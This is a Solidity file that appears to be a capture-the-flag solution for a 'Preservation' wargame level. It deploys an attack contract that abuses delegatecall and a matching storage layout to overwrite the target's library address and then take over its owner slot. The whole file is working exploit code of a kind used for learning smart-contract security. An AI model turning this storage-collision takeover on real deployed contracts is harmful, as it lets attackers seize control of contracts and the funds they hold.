// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "../../../src/levels/16-Preservation/Preservation.sol";

contract PreservationAttack {
    // same storage layout as the Preservation contract.
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    Preservation p;

    constructor(address _target) {
        p = Preservation(_target);
    }

    function attackPreservation(address _owner) external {
        // this will set the address of the timeZone1Library in Preservation contract
        // to be our attacker contract address.
        p.setFirstTime(uint256(uint160(address(this))));
        // this will now call our setTime function and we
        // set the owner of the Preservation contract to the attacker address.
        p.setFirstTime(uint256(uint160(_owner)));
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
